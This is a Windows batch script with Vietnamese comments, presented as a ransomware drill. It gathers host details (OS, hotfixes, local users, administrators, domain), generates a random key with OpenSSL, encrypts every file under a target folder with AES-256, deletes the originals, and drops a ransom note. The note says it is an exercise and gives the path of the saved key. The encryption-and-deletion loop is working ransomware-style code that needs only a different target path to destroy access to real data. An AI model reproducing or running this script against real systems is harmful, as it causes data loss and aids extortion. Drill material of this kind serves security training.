@echo off
setlocal enabledelayedexpansion

:: ========================= PHAN 1: CAU HINH VA THU THAP THONG TIN =========================

:: --- CÀI ĐẶT CHUNG ---
REM Ten file output se duoc dat theo ten may tinh (hostname)
set "OUTPUT_FILE=%COMPUTERNAME%.txt"
set "OUTPUT_FILE_FULL_PATH=%cd%\%OUTPUT_FILE%"

REM Cau hinh cho phan ma hoa
set "TARGET_DIR=D:\NamTN\2025\Ransomware drill\Ransomware\Encrypt"
set "RANSOM_NOTE=_FILES_ENCRYPTED_.txt"
set "EXTENSION=.drill"

echo [INFO] Bat dau script...
echo [INFO] File luu thong tin va key se la: %OUTPUT_FILE%
echo.

:: --- THU THAP THONG TIN HE THONG ---
echo Dang thu thap thong tin he thong... Vui long cho.

REM Xoa file output cu neu co va tao file moi voi tieu de
echo THONG TIN HE THONG (%COMPUTERNAME%) > %OUTPUT_FILE%
echo Chay vao luc: %date% %time% >> %OUTPUT_FILE%
echo =================================================================== >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%

REM --- 1, 2 & 3. Thong tin OS, phien ban va ban va ---
echo [1, 2, 3] THONG TIN HE DIEU HANH, PHIEN BAN VA BAN VA >> %OUTPUT_FILE%
echo --------------------------------------------------- >> %OUTPUT_FILE%
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)" >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%

REM --- 4. Danh sach tai khoan va quyen quan tri ---
echo [4] TAI KHOAN NGUOI DUNG VA QUYEN QUAN TRI >> %OUTPUT_FILE%
echo -------------------------------------------- >> %OUTPUT_FILE%
echo --- Tat ca tai khoan nguoi dung (Local): >> %OUTPUT_FILE%
net user >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%
echo --- Tai khoan co quyen Quan tri (Members of Administrators group): >> %OUTPUT_FILE%
net localgroup Administrators >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%

REM --- 5. Ten may chu va thong tin Domain ---
echo [5] TEN MAY CHU (HOSTNAME) VA DOMAIN >> %OUTPUT_FILE%
echo -------------------------------------- >> %OUTPUT_FILE%
echo Hostname: %COMPUTERNAME% >> %OUTPUT_FILE%
echo Domain: %USERDOMAIN% >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%

echo [HOAN TAT] Da thu thap xong thong tin he thong.
echo.

:: ========================= PHAN 2: TAO KEY VA MA HOA =========================

:: --- KIEM TRA DIEU KIEN TRUOC KHI CHAY ---
REM Kiểm tra xem OpenSSL đã được cài đặt chưa
where openssl >nul 2>nul
if %errorlevel% neq 0 (
    echo [LOI] OpenSSL khong duoc tim thay. Vui long cai dat OpenSSL va them vao bien PATH.
    pause
    exit /b 1
)

REM Kiểm tra xem thư mục đích có tồn tại không
if not exist "%TARGET_DIR%\" (
    echo [LOI] Thu muc "%TARGET_DIR%" khong ton tai.
    pause
    exit /b 1
)

REM Kiểm tra xem thư mục đã bị mã hóa chưa
echo [INFO] Kiem tra trang thai thu muc "%TARGET_DIR%"...
dir /s /b "%TARGET_DIR%\*%EXTENSION%" >nul 2>nul
if %errorlevel% equ 0 (
    echo [CANH BAO] Da tim thay file da ma hoa ^(duoi %EXTENSION%^) trong thu muc.
    echo Script se khong thuc hien de tranh ma hoa lai du lieu.
    pause
    exit /b 0
)
echo [INFO] Thu muc chua bi ma hoa. Bat dau qua trinh ma hoa...
echo.

:: --- TAO KEY VA LUU VAO FILE ---
echo [INFO] Dang tao key ma hoa...
REM Tao key va luu vao mot bien
for /f "delims=" %%k in ('openssl rand -base64 32') do set "ENCRYPTION_KEY=%%k"

REM Ghi key vao cuoi file output
echo =================================================================== >> %OUTPUT_FILE%
echo. >> %OUTPUT_FILE%
echo [KEY MA HOA] - Hay luu key nay can than de giai ma >> %OUTPUT_FILE%
echo --------------------------------------------------- >> %OUTPUT_FILE%
echo !ENCRYPTION_KEY! >> %OUTPUT_FILE%

echo [INFO] Da tao key va luu vao file: %OUTPUT_FILE%
echo.

:: --- TIEN HANH MA HOA ---
REM Chuyển đến thư mục đích
pushd "%TARGET_DIR%"

echo [INFO] Bat dau qua trinh ma hoa cac file trong "%TARGET_DIR%"...
for /r "%TARGET_DIR%" %%F in (*) do (
    set "filename=%%~nxF"
    set "extension=%%~xF"
    
    REM Loai tru chinh file script nay, file ransom note va cac file da ma hoa
    if /i not "%%~fF"=="%~f0" (
        if /i not "%%~fF"=="%OUTPUT_FILE_FULL_PATH%" (
            if /i not "!filename!"=="%RANSOM_NOTE%" (
                if /i not "!extension!"=="%EXTENSION%" (
                    REM Ma hoa file bang key da luu trong bien
                    openssl enc -aes-256-cbc -salt -in "%%F" -out "%%F%EXTENSION%" -pass pass:!ENCRYPTION_KEY! -pbkdf2
                    
                    if !errorlevel! equ 0 (
                        REM Xoa file goc neu ma hoa thanh cong
                        del /F /Q "%%F"
                    ) else (
                        echo [LOI] Ma hoa file "%%F" that bai.
                    )
                )
            )
        )
    )
)

:: --- TAO FILE CANH BAO ---
echo [INFO] Dang tao file canh bao...
(
    echo @@@ CANH BAO QUAN TRONG @@@
    echo.
    echo Tat ca cac file quan trong cua ban trong thu muc %TARGET_DIR% da bi MA HOA.
    echo De khoi phuc lai file, ban can key giai ma duy nhat.
    echo.
    echo Day la mot phan cua DIEN TAP RANSOMWARE.
    echo Neu day la tinh huong thuc, ban se duoc yeu cau tra tien chuoc.
    echo.
    echo Vui long bao cao su co nay cho doi ngu IT/Security cua ban ngay lap tuc.
    echo Key giai ma da duoc luu cung thong tin he thong trong file:
    echo %OUTPUT_FILE_FULL_PATH%
) > %RANSOM_NOTE%

echo.
echo [HOAN TAT] Qua trinh ma hoa da hoan thanh.
echo Toan bo thong tin he thong va key giai ma da duoc luu tai: %OUTPUT_FILE_FULL_PATH%

REM Quay tro lai thu muc ban dau
popd

echo.
pause